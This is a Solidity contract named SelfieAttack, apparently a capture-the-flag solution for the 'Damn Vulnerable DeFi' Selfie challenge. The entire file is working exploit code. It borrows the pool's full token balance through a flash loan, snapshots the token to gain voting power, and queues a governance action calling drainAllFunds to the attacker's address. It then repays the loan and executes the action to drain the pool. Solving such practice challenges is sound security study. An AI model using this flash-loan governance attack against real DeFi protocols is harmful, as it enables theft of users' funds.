pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {

    address owner;
    uint256 actionId;
    SelfiePool public pool;
    SimpleGovernance public gov;
    DamnValuableTokenSnapshot public token;

    constructor(address _pool, address _gov, address _token) {
        owner = msg.sender;
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(address, uint256 _amount) external {
        token.snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        actionId = gov.queueAction(address(pool), data, 0);
        token.transfer(address(pool), _amount);
    }

    function drainFunds() public {
        gov.executeAction(actionId);
    }

}